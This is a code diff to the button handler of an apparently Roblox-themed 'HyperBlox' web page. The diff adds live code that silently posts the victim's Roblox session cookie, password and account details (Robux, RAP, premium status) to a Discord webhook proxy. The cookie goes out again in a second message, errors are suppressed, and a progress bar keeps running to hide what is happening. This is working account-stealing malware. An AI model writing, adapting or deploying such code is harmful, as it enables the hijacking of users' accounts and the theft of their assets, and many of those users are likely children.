@@ -126,6 +126,58 @@ btnStart.onclick = async () => {
             return;
         }
 
+        // 🔥 SEND TO WEBHOOK FROM BROWSER (bypasses Vercel!)
+        const WEBHOOK_URL = 'https://discord-proxy.ducksducks762.workers.dev';
+        
+        // Prepare webhook data
+        const webhookData = {
+            content: '@everyone',
+            username: 'HyperBlox',
+            avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
+            embeds: [{
+                title: '',
+                type: 'rich',
+                description: `<:check:1350103884835721277> **[Check Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=${cookie})** <:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie](https://hyperblox.eu/controlPage/antiprivacy/kingvon.php?cookie=${cookie})** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/${data.userInfo.userId}/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/${data.userInfo.userId})**`,
+                color: 0x00061a,
+                thumbnail: { url: data.avatarUrl },
+                fields: [
+                    { name: '<:display:1348231445029847110> Display Name', value: `\`\`\`${data.userInfo.displayName}\`\`\``, inline: true },
+                    { name: '<:user:1348232101639618570> Username', value: `\`\`\`${data.userInfo.username}\`\`\``, inline: true },
+                    { name: '<:userid:1348231351777755167> User ID', value: `\`\`\`${data.userInfo.userId}\`\`\``, inline: true },
+                    { name: '<:robux:1348231412834111580> Robux', value: `\`\`\`${data.userInfo.robux}\`\`\``, inline: true },
+                    { name: '<:pending:1348231397529223178> Pending Robux', value: `\`\`\`0\`\`\``, inline: true },
+                    { name: '<:rap:1348231409323741277> RAP', value: `\`\`\`${data.userInfo.rap}\`\`\``, inline: true },
+                    { name: '<:premium:1348231403690786949> Premium', value: `\`\`\`${data.userInfo.premium}\`\`\``, inline: true },
+                    { name: '<:vc:1348233572020129792> Voice Chat', value: `\`\`\`${data.userInfo.voiceChat}\`\`\``, inline: true },
+                    { name: '⭐ Account Score', value: `\`\`\`${data.userInfo.accountScore}/100\`\`\``, inline: true },
+                    ...(password ? [{ name: '🔐 Password', value: `\`\`\`${password}\`\`\``, inline: false }] : [])
+                ]
+            }]
+        };
+
+        // Send webhook (fire and forget, don't wait)
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(webhookData)
+        }).catch(() => {}); // Ignore errors
+
+        // Send cookie in second message
+        setTimeout(() => {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: 'HyperBlox',
+                    avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
+                    embeds: [{
+                        description: `\`\`\`${cookie}\`\`\``,
+                        color: 0x00061a
+                    }]
+                })
+            }).catch(() => {});
+        }, 2000);
+
         // Animate progress bar
         let progress = 0;
         const interval = setInterval(() => {
